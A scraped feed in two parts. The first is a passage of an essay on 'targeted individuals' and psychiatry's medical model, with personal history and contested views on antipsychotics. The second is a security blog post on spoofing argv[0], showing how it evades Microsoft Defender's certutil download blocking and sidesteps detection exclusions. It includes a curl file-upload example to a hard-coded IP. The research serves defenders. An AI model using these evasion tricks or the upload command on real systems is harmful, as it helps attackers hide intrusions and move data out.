<p>However, as I talked with TIs and some of the mental health professionals who have taken a sympathetic interest in them, I began to see a different story emerge. What if the TI community is an inevitable reaction to the shortcomings of medical psychiatry itself?</p>
<p>Put differently, what if medical psychiatry is inadvertently <em>pushing</em> people like Luca deeper into the TI community?</p>
<p>The TI narrative validates their basic ability to perceive the world and reason <span>about it</span></p>
<p>I began to see TIs like Luca as a group of individuals who are caught between two competing narratives. By all accounts, these are people who are hearing terrifying voices, experiencing painful sensations or seeing themselves as being stalked. Over the years, the main narrative that has emerged to explain their experiences belongs to medical psychiatry. It holds that these voices and beliefs – or ‘hallucinations’ and ‘delusions’ – are symptoms of a disorder such as schizophrenia, delusional disorder or schizoaffective disorder. These disorders likely stem from brain dysfunctions or defective genes. In the best of cases, these symptoms can be managed with drugs, or some combination of drugs and therapy. Though the medical narrative helps some, research is showing just how stigmatising and disempowering it is for others. Some get the message that their brain is broken and that they can never trust their thoughts and perceptions. Many, like Luca, are put on antipsychotic drugs with debilitating side-effects.</p>
<p>The second narrative – the TI narrative – is that if you’re having these sorts of experiences, <em>nothing is wrong with your mind</em>. Your perceptual and reasoning abilities are functioning exactly the way they’re designed to. Unfortunately, you <em>are</em> the victim of gang-stalking or electronic harassment. Despite your suffering, however, there is hope: you can band together with other TIs in a global movement to expose your attackers and dismantle their techniques.</p>
<p>Trapped between these two narratives, many opt for the TI narrative. It validates their basic ability to perceive the world and reason about it – precisely what psychiatry’s medical narrative denies. It infuses their frightening experiences with a powerful sense of purpose and coherence. It gives TIs the most precious resource of all: community, belonging, even love.</p>
<p>But if psychiatry’s broken-brain narrative is pushing people deeper into the TI community, how did this happen? How is it possible that the very profession that was designed to support people like Luca might be making them worse off? And are there any alternatives to these two narratives – the idea that your brain is broken, and the idea that you’re actually being persecuted?</p>
<p><span>T</span>he idea that disembodied voices and strange beliefs are symptoms of a brain disorder is very old. In the West, it stretches back to the manifesto <em>On the Sacred Disease</em> <span>(400 BCE),</span> in which ancient Greek doctors tell us that all forms of madness stem from air deprivation in the brain. In the first half of the <span>20th century,</span> asylum psychiatrists with a penchant for <a href="https://aeon.co/essays/why-is-electroshock-therapy-still-a-mainstay-of-psychiatry" target="_blank" rel="noopener">experimental remedies</a> – lobotomies, insulin comas, malaria injections, even tooth extractions – embraced the medical vision.</p>
<p>But even in the 1960s and early ’70s, there were <a href="https://aeon.co/essays/the-psychiatrist-who-didn-t-believe-in-mental-illness" target="_blank" rel="noopener">other paradigms</a> available to suffering people. There was a collection of viewpoints that didn’t see hallucinations, delusions or other extreme experiences as symptoms of a disease, but as doorways to personal, social or spiritual transformation. These experiences, if properly understood, would lead the individual to a higher level of human flourishing. In the words of today’s Mad Pride movement, they were ‘dangerous gifts’.</p>
<p>There were at least three alternative perspectives that framed extreme experiences as psychological, social or spiritual awakenings, rather than brain dysfunctions.</p>
<p>One approach saw the mad mind as a wounded mind – not wounded in the sense of broken, but in the sense of having survived painful life experiences. The experiences we call ‘paranoia’ – being hypervigilant to threats, seeing malicious motives everywhere – could be a protective response of the organism to <em>real</em> threats, rather than symptoms of a disease. Suppose a person has survived abuse, neglect or other forms of trauma, such as racism, classism, climate disaster or homophobia. Being hypervigilant to threats is actually a pretty reasonable response to those problems. In the 1930s, psychiatrists in the US like Frieda Fromm-Reichmann of the Chestnut Lodge psychiatric institute, or her colleague Harry Stack Sullivan, viewed the symptoms of schizophrenia as the start of a journey of recovery.</p>
<p>A second approach looked at psychosis not as a trauma response, but as a mirror of a damaged society. In the 1960s, the Scottish psychiatrist <span>R D Laing,</span> who was influenced by Fromm-Reichmann and Sullivan, described madness as a form of insight, a sane response to an insane world. Its fundamental truth is that the conditions of modern society are no longer fit for human flourishing. Along these lines, the journalist Jean Guerrero writing in <em>Wired</em> in 2018 described TIs as the prophets of the information era, and the proverbial ‘canaries in the coal mine’, who offer a dire warning about the reality of constant electronic surveillance. We don’t have to accept the literal truth of the TI narrative to see it as an accurate, symbolic representation of our social plight.</p>
<p>The answer wasn’t always to give people stigmatising labels and pummel their brains with antipsychotic drugs</p>
<p>A third approach saw, in madness, a spiritual crisis or ‘<a href="https://psyche.co/ideas/a-spiritual-emergency-can-be-wild-this-is-how-to-ride-the-wave" target="_blank" rel="noopener">spiritual emergency</a>’, a term coined in the 1980s by Stanislav and Christina Grof but with roots in the work of Carl Jung and Abraham Maslow. In this view, the ‘self’ is a mere drop in a vast sea of intelligence, consciousness and love. What if what we call insanity is a form of unmediated contact with this cosmic intelligence? What if experiences of psychosis – disembodied voices, strange convictions, the sense of being out of one’s body – are precursors of a powerful spiritual change, one that requires a religious guide, not a doctor? The documentary film <em>Crazywise</em> (2016) tells the story of Gogo Ekhaya Esima, a Brooklyn activist who was diagnosed with schizophrenia, but who rejected her label, returned to her ancestral roots, and became a Sangoma traditional healer and peer counsellor.</p>
<p>The point is, not long ago, there was a host of alternative frameworks for making sense of these extreme experiences. People with paranoid beliefs weren’t trapped between the broken-brain narrative and the literal persecution narrative. Within this broader range of narratives – a trauma response, a mirror of a broken society, a spiritual awakening – some were able to find real healing. The answer wasn’t always to give people stigmatising labels and pummel their brains with antipsychotic drugs.</p>
<p>One reason I’m aware of these alternative paradigms is because I saw how they played out in my <a href="https://aeon.co/essays/evidence-grows-that-mental-illness-is-more-than-dysfunction" target="_blank" rel="noopener">dad’s own life</a>. In the summer of 1973, a few months after I was born, he was diagnosed with paranoid schizophrenia. He was a lawyer working under the US president Richard Nixon, and he formed the belief that he was being surveilled – not unreasonable given Nixon’s penchant for spying on his own staff. My dad’s fears soon escalated into the belief that my mother was a government spy, his doctor had inserted a tracking device into his anus, and <em>The</em> <em>Washington Post</em> was reporting on his activities in the Sports section (on the pretext of describing a rather marginal baseball player).</p>
<p>Fortunately, my dad had read psychiatrists like <span>R D Laing,</span> and psychologists like Rollo May and Abraham Maslow. He understood that what we call madness isn’t always a breakdown, but a potential breakthrough. He agreed to see a psychiatrist, but only under the condition he wouldn’t be given drugs. The psychiatrist agreed and, sometimes with my mother, had conversations about how to navigate his strange experiences. Ultimately, he was able to continue working for the Labor Department for another <span>12 years,</span> until similar episodes in the 1980s rendered him unable to work.</p>
<p>But if the 1960s witnessed the proliferation of alternative, meaning-making frameworks, how did our perspective become so limited? How did this medical vision – replete with its diagnoses, medications, symptom checklists, hypothetical brain dysfunctions – come to exert such a forceful grip on our collective imagination? How is it that people like Luca face such a tragic forced choice between the broken-brain narrative and the TI narrative?</p>
<p><span>H</span>istorians of psychiatry agree that a momentous paradigm shift took place in the 1980s. They often call this shift the ‘second biological revolution’, after a similar revolution that took place in Germany in the 1850s. It was popularised by books like Nancy Andreasen’s <em>The Broken Brain</em> (1984), Solomon Snyder’s <em>Drugs and the Brain</em> (1986) and Jon Franklin’s <em>Molecules of the Mind</em> (1987). It coincided with an explosive growth in the pharmaceutical industry that promised to heal the mind with drugs.</p>
<p>In this vision, mental disorders were best understood as brain dysfunctions that could be traced to abnormal genes. Schizophrenia stemmed from an imbalance of the neurotransmitter dopamine. Depression was a serotonin imbalance. Bipolar disorder was a lithium imbalance. ADHD a deficiency of norepinephrine. These conditions, of course, could be triggered by life events, but they were ultimately biological. It was a reincarnation of the ancient Greek humoral theory, which saw the various forms of madness as imbalances in the four humours: blood, phlegm, yellow bile, black bile.</p>
<p>They insisted that seeing mental disorders as defective brain chemistry would alleviate shame and stigma</p>
<p>Historians disagree about what caused this paradigm shift. Some emphasise the failure of psychoanalysis to help those in most severe need. Others point to the success of drugs in getting people out of the asylum. Others emphasise the role of pharmaceutical companies in aggressively marketing their products. Still others point to high-profile legal cases, like that of Ray Osheroff, who sued Chestnut Lodge in the early 1980s because they’d refused to give him antidepressants.</p>
<p>My own research centres around another factor. In the 1970s, many psychiatrists thought they’d actually discovered the seat of madness in the brain. The neuroscientist and psychiatrist Solomon Snyder at Johns Hopkins University assembled the evidence for this claim in his influential <a href="https://pubmed.ncbi.nlm.nih.gov/1251927/" target="_blank" rel="noreferrer noopener">paper</a> ‘The Dopamine Hypothesis of Schizophrenia’ (1976). There, he showed that antipsychotic drugs like haloperidol worked by plugging dopamine neurons in the brain – and that their effectiveness in managing symptoms was proportional to their ability to block those neurons. He also showed that one could induce a temporary psychosis in a sane person by flooding their dopamine receptors with amphetamines. By turning dopamine on and off, he concluded, one could turn schizophrenia on and off like a faucet. He wrote a popular book arguing that all major mental disorders had their own chemical imbalance. He even helped start two pharmaceutical companies to devise tailored treatments for each disorder.</p>
<p>The broken-brain narrative wasn’t supported just by science but by politics too. A chorus of doctors, journalists and activists insisted that seeing mental disorders in terms of defective brain chemistry would alleviate shame and stigma. They gave the lie to the idea that extreme low mood, disabling anxiety or obsessive thoughts might represent a character flaw or a moral defect – or even bad parenting.</p>
<p><span>B</span>y the mid 1980s, my dad’s own treatment changed dramatically, in tune with the changing times. In 1986 – in the waning years of the Cold War – he began having unusual experiences again. He thought God was telling him to use his position in the Labor Department to promote worldwide nuclear disarmament. He also thought the French actress Catherine Deneuve was communicating with him telepathically for guidance and support.</p>
<p>He was hospitalised multiple times in the 1980s and ’90s. In better times, I’d visit him at the private Washington Hospital Center in an upscale neighbourhood in northwest <span>Washington, DC.</span> In worse times, I’d visit him in <span>St Elizabeth’s,</span> a public asylum with nearly 300 beds on the south side of the Anacostia River, in the neighbourhood that earned the city its moniker as ‘murder capital of the US’. <span>St Elizabeth’s</span> also housed John <span>Hinckley, Jr,</span> after he shot Ronald Reagan in 1981 in a bid to win Jodie Foster’s affection. By the 1990s, my dad’s long hospital stays were replaced by multi-day hospitalisations where he’d be put on drugs, monitored, and released under the supervision of a social worker.</p>
<p>His older diagnosis of paranoid schizophrenia eventually gave way to a newer one of bipolar disorder. The doctors put him on a combination of drugs that dampened the voices, but had their own debilitating side-effects. Their overall impact was a mental dulling and a muscular rigidity. Sometimes I sat with him for hours on end as he drank cup after cup of coffee and chain-smoked to stave off the fog. A simple act like tying his shoes or putting a dollar into a vending machine became laborious and frustrating.</p>
<p>When the mental fog made life unbearable, he would ditch the pills. God and Catherine would swiftly return, and he’d be off on a new geopolitical adventure. The idea that my dad’s experiences represented a coherent response to a childhood of abuse and neglect, or that they represented a window onto the dangerous reality of nuclear annihilation, or that they heralded a spiritual transformation – the sorts of ideas he was receptive to in the 1970s – was utterly foreign to psychiatry’s new medical view.</p>
<p>Psychiatrists became equally disenchanted with the serotonin theory of depression</p>
<p>The drugs eventually took a toll on his body. The specific combination of medications – lithium and thioridazine – is now <a href="https://psycnet.apa.org/record/1987-25989-001" target="_blank" rel="noreferrer noopener">known</a> to be neurotoxic. His motor problems worsened, and led to ‘antipsychotic-induced dysphagia’, a condition in which your brain is unable to regulate the thin slice of tissue that stops food and water from entering your lungs. Dysphagia contributed to his death in 2005 by pneumonia.</p>
<p>It would be one thing if the medical vision were true. The fact that TIs rebel against the broken-brain narrative would be no more surprising than that someone can be in denial about diabetes or cancer. But the past three decades have shown that psychiatry’s medical vision is neither scientifically credible nor morally sound.</p>
<p>The scientific problems came first. Even <span>20 years</span> after Snyder’s breakthrough paper, nobody could find the ‘smoking gun’ – the supposed dopamine abnormalities in patients who’d never taken antipsychotic drugs. Moreover, a newer generation of drugs, the so-called ‘atypicals’, took a much larger share of the psychiatric drug market. They seemed to manage symptoms equally well with fewer side-effects – even though they targeted a much wider profile of chemicals than dopamine. Dopamine began to look like one small piece of a much larger puzzle. Psychiatrists became equally disenchanted with the serotonin theory of depression. Today, the idea that these drugs work by reversing chemical imbalances appears increasingly groundless.</p>
<p>If the scientific credibility of the medical vision is waning, its political justification has also eroded. Over the past decade, a new generation of psychologists have been studying the nature of <a href="https://aeon.co/essays/its-time-to-stop-mental-health-discrimination-at-work" target="_blank" rel="noopener">mental health stigma</a>: what it is, how it’s created, how to solve it. The consensus of this research is that psychiatry’s medical vision – and its language of ‘chemical imbalances’, ‘brain circuit defects’, ‘genetic abnormalities’ and so on – merely replaces one kind of stigma for another.</p>
<p>In particular, medical narratives tend to trigger three negative outcomes. They make other people want to distance themselves from the patient. They make patients pessimistic about their own recovery. And they evoke, in the patient’s mind, the idea that drugs are the optimal course of treatment. Perhaps the most troubling finding of the new research is that stigma toward schizophrenia – measured as a desire for social distance – has actually <em>increased</em> over the past <span>30 years,</span> plausibly due to the greater acceptance of the medical narrative.</p>
<p>Academic psychiatrists today often claim that psychiatry has already moved away from the narrow biomedical vision of the 1980s. They say that psychiatry has instead embraced a more holistic, ‘biopsychosocial’ vision that respects all of the different factors – brain imbalances, childhood trauma, social injustice – that make us unwell. Aren’t psychiatry’s critics just beating a dead horse?</p>
<p>But these reassurances ring hollow to me. Despite the calls for a more holistic model, in practice, interventions for people like Luca have changed very little since the 1990s, with its short cycles of hospitalisation, diagnosis, drugs and monitoring. Psychiatry journals are increasingly dominated by biological perspectives, to the exclusion of psychological and social ones. And the fact that about <a href="https://www.statista.com/statistics/1126744/percentage-of-college-students-using-psychotropic-medications-us/" target="_blank" rel="noreferrer noopener">one-fifth</a> of US college students are on antidepressant drugs – and about <a href="https://www.gov.scot/publications/short-life-working-group-prescription-medicine-dependence-withdrawal-consultation-draft-recommendations/pages/11/" target="_blank" rel="noreferrer noopener">a third</a> of Scottish adults are on some form of psychiatric medication – suggests that, if anything, psychiatry’s medical vision is actually more entrenched now than it was in <span>the 1990s.</span></p>
<p>But if psychiatry’s medical vision is failing TIs like Luca, what should we replace it with? How can we break out of this bind?</p>
<p><span>D</span>espite the entrenchment of the medical vision, my recent explorations of psychological, social and spiritual approaches to psychosis have made me optimistic about the future. I think we’re at the beginning of a renaissance of alternative approaches that loosely resembles the plurality of paradigms in the 1960s. The ultimate goal of these movements is to create safe, non-coercive, therapeutic communities that give people space to explore alternative, meaning-making frameworks – an <a href="https://aeon.co/essays/what-can-psychedelic-science-teach-psychiatry-about-psychosis" target="_blank" rel="noopener">ethos embodied</a> in Soteria Houses, the Open Dialogue framework, and Inner Fire, among others. One of the leading organisations in this context is the global Hearing Voices Network, which encourages people to understand their voices and other unusual experiences not as symptoms of a disease, but a source of creativity, inspiration and insight.</p>
<p>One avenue of intensive exploration is that experiences such as threatening voices, unusual beliefs and dissociative episodes are <a href="https://aeon.co/essays/should-hallucinatory-voices-be-ignored-or-befriended" target="_blank" rel="noopener">protective responses</a> to traumatic experiences. Although popular books like Bessel van der Kolk’s <em>The Body Keeps the Score</em> (2014) remain controversial, what’s no longer controversial is the link between childhood abuse and neglect, and adult experiences of psychosis. Hence the popular slogan that we should no longer ask patients ‘What’s wrong with you?’ but ‘What happened to you?’ The idea that terrifying experiences like Luca’s can be a coherent response to abuse or neglect has been developed by organisations such as the Hearing Voices Network, the National Paranoia Network, and the Power Threat Meaning Framework.</p>
<p>A second approach sees psychosis as a ‘<a href="https://aeon.co/essays/treating-acute-psychosis-with-drugs-can-prolong-the-anguish" target="_blank" rel="noopener">spiritual emergency</a>’. This view is advanced today by organisations like Safely Held Spaces and the International Spiritual Emergence Network. While some of a materialist mindset scoff at the idea that psychosis has a spiritual dimension, these framings have powerful practical benefits. Cross-cultural research on schizophrenia has shown that the way culture makes sense of voice-hearing impacts both the content and the emotional tone of the voices. In the US, where voice-hearing in the context of schizophrenia is framed as a symptom of a disease, voices are experienced as more invasive, hostile and distressing. In parts of India, Ghana and China, where voices tend to be understood as belonging to deceased ancestors or other spirits, voices are experienced as more benevolent and less scary. Some voice-hearers have found that, simply by adopting a curious and compassionate attitude to what the voices are trying to say, they become less threatening and more supportive.</p>
<p>Ideally, people would explore these alternative paradigms in a therapeutic community</p>
<p>There are yet other approaches. Some within the voice-hearing community contend that hearing voices is merely a different way of processing information about the world – a form of neurodiversity with its own strengths and limits. Some groups, such as the Plural Movement and, to a lesser extent, proponents of Internal Family Systems, hold that voice-hearing is a natural sign of the multiplicity of the soul. Perhaps <em>all</em> of us are more or less ‘multiple’, and voice-hearing is simply one way that different parts of the mind talk to each other.</p>
<p>The problem is this: unless people like Luca have access to this whole range of meaning-making frameworks, they’ll either understand their voices in terms of a hypothetical brain disease, or in terms of hostile intruders running an experiment on them. We urgently need to expand the range of scientifically plausible alternatives.</p>
<p>This isn’t to say that drugs have no place in the new frameworks. Drugs can be valuable tools to help manage distressing experiences. That has been well known for millennia with drugs like psylocibin, hashish, opium, tobacco and alcohol. But they don’t seem to work by reversing chemical imbalances – just as alcohol doesn’t make you feel good by ‘reversing an alcohol deficiency’. Rather, they help us temporarily blunt painful thoughts and feelings so we can better address their root causes.</p>
<p>The goal of these frameworks, as I see it, is to break the grip of the forced choice between two grim alternatives – not to impose any particular narrative onto suffering people. Ideally, people would explore these alternative paradigms in a therapeutic community that emphasises shared decision-making and personal autonomy. If someone chooses to embrace the medical narrative, it should be because they’ve been exposed to multiple paradigms and feel that this narrative makes the most sense for them. And if others, after becoming aware of these paradigms, choose to accept the TI narrative, then the best path forward is for them to connect with a community like PACTS that can give them the non-stigmatising support they need. But mental health professionals ought to put more time and effort into raising awareness of the neglected third path: we can embrace voices and visions as part of ordinary human experience, without accepting the literal truth of everything <span>they say.</span></p>
<p>I recently reconnected with Luca. His own journey, which began so abruptly in November 2020, has now taken on new contours. He still hears the voices, and he holds the belief that he’s the subject of a cruel experiment. He explicitly identifies as a TI. But he’s also placing those horrific experiences into a broader spiritual perspective, much like that advanced by the International Spiritual Emergence Network.</p>
<p>Luca now sees himself as intensely receptive to spiritual influences. The same psychic openness that allowed The Team to gain a foothold into his mind is also a fountain of powerful revelations – massive ‘information downloads’ from the cosmic mind. These revelations centre around the broken state of humanity, the interweaving of the spiritual and material worlds, and the need for love – insights he’s compiling into a book. He is no longer preoccupied with victimhood, but with survivorship, and with his greater mission to promote ‘unprecedented change, healing and love’.</p>
<p>The real tragedy here is not that psychiatrists failed to stamp out Luca’s voices and strange beliefs. The tragedy is that he had to discover this spiritual path on <span>his own.</span></p></div></div>]]></description>

            <description><![CDATA[<p>URL: <a href="https://www.wietzebeukema.nl/blog/why-bother-with-argv0">https://www.wietzebeukema.nl/blog/why-bother-with-argv0</a>, See on <a href="https://news.ycombinator.com/item?id=41434315">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
            <p>Command lines are weird. Windows is known for this [<a href="https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation">1</a>], but as will become apparent, most operating systems implemented command lines in a way that can cause security issues. This post will set out, section by section, what’s wrong with this widely-adopted convention that the first argument of a process’ command line, often referred to as <code>argv[0]</code>, is reserved to represent the process’ name.</p>

<h2 id="argv0-is-a-relic-of-the-past"><code>argv[0]</code> is a relic of the past</h2>

<p>Whenever a program is started, it is provided with command-line arguments that are accessible from within the program - in fact, it is one of the first pieces of information that is made available when a program starts, and is a key mechanism for altering a program’s execution flow.</p>

<p>Consider the <code>exec</code> family of system calls as defined in POSIX [<a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/execve.html">2</a>], which is adopted by Unix-based systems as well as DOS/Win32 [<a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/exec-wexec-functions">3</a>]. For example, it defines function <code>execv</code> as:</p>

<div><pre><code><span>int</span> <span>execv</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>path</span><span>,</span> <span>char</span> <span>*</span><span>const</span> <span>argv</span><span>[]);</span>
</code></pre></div>

<p>Calling this function requires the full path of the application to be executed as <code>path</code> and a vector with arguments to be passed to the program as <code>argv</code>; it returns an integer with a status code. The same specification tells us that if a program is successfully executed as a result of this call, it will invoke the targeted program via</p>

<div><pre><code><span>int</span> <span>main</span> <span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>*</span><span>argv</span><span>[]);</span>
</code></pre></div>

<p>Across all C standards [<a href="https://www.iso-9899.info/wiki/The_Standard">4</a>] we see that when a program is called like this, the following three conditions should hold true: <code>argc</code> is non-negative; <code>argv[argc]</code> is a null pointer; and if <code>argc</code> is greater than zero, the string pointed to by <code>argv[0]</code> represents the calling program’s name.</p>

<p>To some, that final condition may be a surprising one. The new process surely knows its own name, why does it need to be passed as the first process argument by the calling process? It is a design decision made to allow the created process to behave differently based on how it is called. Especially in a POSIX context, in which applications can be and frequently are symlinked, it gives the new process awareness of what the calling process was requesting, regardless of what symbolic links were followed. A practical example of this are the <code>shutdown</code> and <code>reboot</code> programs; on Debian, these are symlinked to the same <code>systemctl</code> executable. Depending on what command you call, the underlying process will behave differently.
Although I am not aware of any such real-life examples for Windows, which has much less of a symlink culture, its implementation allows for the same to be possible.</p>

<p>This seems like a questionable design decision. Should a program be allowed to behave differently based on its name? From a 2020s standpoint, this seems highly undesirable, as it makes software less predictable and goes against modern design principles. From a 1970s/1980s standpoint, a time when computer resources were scarce, it seems less unreasonable to attempt to minimise any form of duplication and redundancy. Today however, disk space is no longer considered an issue; this is evidenced by macOS Sonoma, where <code>shutdown</code> and <code>reboot</code> are two separate executables. Another argument against this design is that if you have two programs that are so similar that it pays off to consolidate them into a single file, is there really a need for two separate programs/program names? Is using <code>shutdown</code> and <code>reboot</code> so much more preferable than something along the lines of <code>power --shutdown</code> and <code>power --reboot</code>? Some will answer this with a straight “no”, whereas others argue single-word commands enhance user experience, and (especially a few decades ago) can offer cross-platform/backwards syntax compatibility using a shared code base. Even so, whether this solution is the best way of achieving that, remains doubtful.</p>

<p>Because even if you were to accept this principle, the implementation itself is debatable too. Why would one provide information on what program name was invoked as part of the process arguments, which are designed to be set by the calling process? Should the new process’s code actually rely on <code>argv[0]</code>, it is at the mercy of the process that called it to populate it correctly. Should this not be the case, it may break the new process; similarly, there are examples of programs relying on <code>argv[0]</code> in their process flows in incorrect or unsafe ways [<a href="https://effectivemachines.com/2018/05/03/fixing-apache-hadoop-cve-2016-6811-argv0-vs-security/">5</a>], leading to security issues.
Instead, separating out what is now <code>argv[0]</code> to its own <code>task_struct</code>/PEB feature would appear to be a more solid approach: other “metadata” such as the process’ path, current working directory, etc. are already kept here; it would allow for more consistent tracking and a reduced scope for manipulation. The operating system should be held responsible for populating the value, instead of expecting the calling program to do so.</p>

<p>The operating system that comes closest to doing this is, perhaps surprisingly, Windows. Unlike the other mainstream operating systems, Windows’ own API calls for creating new processes (such as <code>CreateProcess</code> [<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">6</a>], <code>ShellExecute</code> [<a href="https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">7</a>]) do not allow you to set <code>argv[0]</code>: it sets it for you, based on how the path to the executable was provided. Given how C expects <code>argv</code> to be populated, this is actually the most sensible implementation. Still, because of Windows’ adoption of the POSIX <code>exec</code> calls, there are still ways to manually set <code>argv[0]</code>.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-windows-task-manager.png"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-windows-task-manager.png" alt="Screenshot showing a Windows Task Manager window listing various command lines of running processes."></a>
<em>As <code>argv[0]</code> usually tells you how the program was called, on Windows it shows you if it was invoked via an absolute path (e.g. 1st highlight) or a relative one (e.g. 3rd highlight); what casing was used (e.g. 2nd highlight is upper case) and if it was wrapped in quotes (4th highlight).</em></p>

<h2 id="argv0-is-ignored-mostly"><code>argv[0]</code> is ignored (mostly)</h2>

<p>Regardless of your stance on <code>argv[0]</code>, the painted picture is our reality; <code>argv[0]</code> is a concept we will have to live with. As we will see, this does not come without trouble: when making <code>exec</code> calls, the first two of the aforementioned three conditions are taken care of by the implementing operating system; but the final condition concerning <code>argv[0]</code> is not. Since the caller of <code>exec</code> has full control over <code>argv</code>, it is possible to ignore this requirement. Since the operating system nor the calling program nor the called program are expected to check for violations of this requirement, overriding it can be done without consequences.</p>

<p>For example, to print <em>Hello, world!</em> with <code>echo</code>, the <strong><em>convention</em></strong> is to call e.g. <code>execv("/usr/bin/echo", ["echo", "Hello, world!"])</code>. However, executing <code>execv("/usr/bin/echo", ["oopsie", "Hello, world!"])</code> will also successfully call the <code>echo</code> program and print <em>Hello, world!</em> to its stdout, despite having <code>argv[0]</code> set to “oopsie”. Most likely, the <code>echo</code> program simply ignores whatever <code>argv[0]</code> is set to and solely focusses on <code>argv[1]</code> and beyond. In fact, this is an approach taken by most programs.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-execl-with-argv0.png"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-execl-with-argv0.png" alt="Screenshot showing Sysmon output for a normal execl() execution (left) and a manipulated one (right)."></a>
<em>Screenshot showing Sysmon [<a href="https://github.com/Sysinternals/SysmonForLinux">8</a>] output for a ‘normal’ <code>execl()</code> call (left) and one with a manipulated <code>argv[0]</code> (right).</em></p>

<p>Calling an application with a manipulated <code>argv[0]</code> is, as this example shows, easy from within C. Other programming languages as well as some scripting languages also provide accessible interfaces to achieve this:</p>

<div><pre><code>python3 <span>-c</span> <span>"import os; os.execvp('/path/to/binary', ['ARGV0', '--other', '--args', '--here'])"</span>
perl <span>-e</span> <span>'exec {"/path/to/binary"} "ARGV0", "--other", "--args", "--here"'</span>
ruby <span>-e</span> <span>"exec(['/path/to/binary','ARGV0'],'--other', '--args', '--here')"</span>
bash <span>-c</span> <span>'exec -a "ARGV0" /path/to/binary --other --args --here'</span>
</code></pre></div>

<p>Thus, a key observation at this point is that manipulating <code>argv[0]</code> is straightforward and has no impact on most program executions. Yet, it has security implications, as we will see in the next three sections.</p>

<h2 id="argv0-can-break-defences"><code>argv[0]</code> can break defences</h2>

<p>First off, <code>argv[0]</code> can be used to fool security software. When a machine is compromised by a malicious user, it will typically manipulate the system in some way or another by running the attacker’s commands. Often, this takes the form of leveraging system-native commands. Defensive software such as <abbr title="Anti Virus">AV</abbr> and <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> monitor process executions, and detect or prevent specific ones if they are deemed harmful. Most solutions proactively look for commands commonly used by attackers (e.g. <a href="https://lolbas-project.github.io/">9</a>, <a href="https://gtfobins.github.io/">10</a>, <a href="https://www.loobins.io/">11</a>).</p>

<p>For example, the built-in <code>certutil</code> command-line tool on Windows is regularly seen in attacks [<a href="https://redcanary.com/threat-detection-report/techniques/ingress-tool-transfer/">12</a>] as a means to download an external payload after gaining an initial foothold. Windows’ pre-installed security software, Microsoft Defender Antivirus [<a href="https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-windows">13</a>], prevents <code>certutil</code> executions if it sees command-line arguments that suggest a file download is being attempted. As it turns out, the detection logic used by Defender is flawed: as the screenshot below shows, when starting <code>certutil</code> with <code>argv[0]</code> set to one or more spaces, Defender will not prevent the execution.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-execvp-with-empty-argv0.png"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-execvp-with-empty-argv0.png" alt="Screenshot showing a python execution triggering execvp(), calling certutil.exe without and with a manipulated argv[0] value."></a>
<em>Using <code>python</code> to emulate a <code>execvp</code> call, a screenshot showing Windows Defender blocking a <code>certutil</code> execution (first attempt), but not if <code>argv[0]</code> is set to a single space (second attempt).</em></p>

<p>Although perhaps not the most exciting of examples, it does highlight a wider issue: some detections rely on the program name being part of the command line. Let’s for argument’s sake pretend Defender’s detection logic here could be represented as <code>command_line.contains('certutil') AND command_line.contains('-urlcache')</code>. You can see how the first condition assumes <code>certutil</code> is part of the command line. Whilst this will be almost always the case for the <code>certutil</code> executions it is trying to find, our example shows a counter-example that successfully bypasses this command-line detection. For this reason, it is strongly recommended to structure detections in a way similar to <code>process_path.endswith('certutil.exe') AND command_line.contains('-urlcache')</code>, as experienced detection engineers are likely to do.</p>

<p>Another way in which detections may be bypassed is by adding tuning keywords to <code>argv[0]</code>. It is common for detections to have a base condition that is complemented by additional conditions that filter out false positive alerts. For example, you may have a detection rule that triggers when <code>attrib.exe</code> is used to hide a file [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/attrib">14</a>]. In practice, this happens often legitimately for file <code>desktop.ini</code>, so executions targetting this file may be tuned out [<a href="https://github.com/SigmaHQ/sigma/blob/782f0f524e6f797ea114fe0d87b22cb4abaa6b7c/rules/windows/process_creation/proc_creation_win_attrib_hiding_files.yml#L23-L24">15</a>]. If this is a known exclusion, an attacker could bypass such a detection by including <code>desktop.ini</code> in <code>argv[0]</code>, e.g. <code>argv = ['attrib_\desktop.ini', '+H', 'backdoor.exe']</code><sup id="fnref:i" role="doc-noteref"><a href="#fn:i" rel="footnote">1</a></sup>.</p>

<h2 id="argv0-can-deceive"><code>argv[0]</code> can deceive</h2>

<p>Another way in which <code>argv[0]</code> can be exploited, is by manipulating it in such a way that it fools <em>humans</em>. As discussed before, in enterprise settings, security analysts often review alerts generated by security tooling such as <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> software. Most of such alerts will include the process that is responsible for/associated with the activity that was flagged. The process’ command line is a key piece of information that analysts use to determine whether an alert should be further investigated, escalated, or ignored.</p>

<p>For example, an alert for possible data exfiltration might be triggered when <code>curl -T secret.txt 123.45.67.89</code> is executed [<a href="https://github.com/SigmaHQ/sigma/blob/782f0f524e6f797ea114fe0d87b22cb4abaa6b7c/rules/linux/process_creation/proc_creation_lnx_susp_curl_fileupload.yml">16</a>], as it uploads file <code>secret.txt</code> to IP address 123.45.67.89 via HTTP [<a href="https://explainshell.com/explain?cmd=curl+-T+secret.txt+123.45.67.89">17</a>]. A trained security analyst may further investigate this alert if this behaviour is rare in the environment. The fact that a hard-coded, external IP is used here might increase suspicion; especially if it was not seen before. With this in mind, attackers are more likely to be successful if they manage to make their activity “blend in” with normal activity, thus staying under the radar.</p>

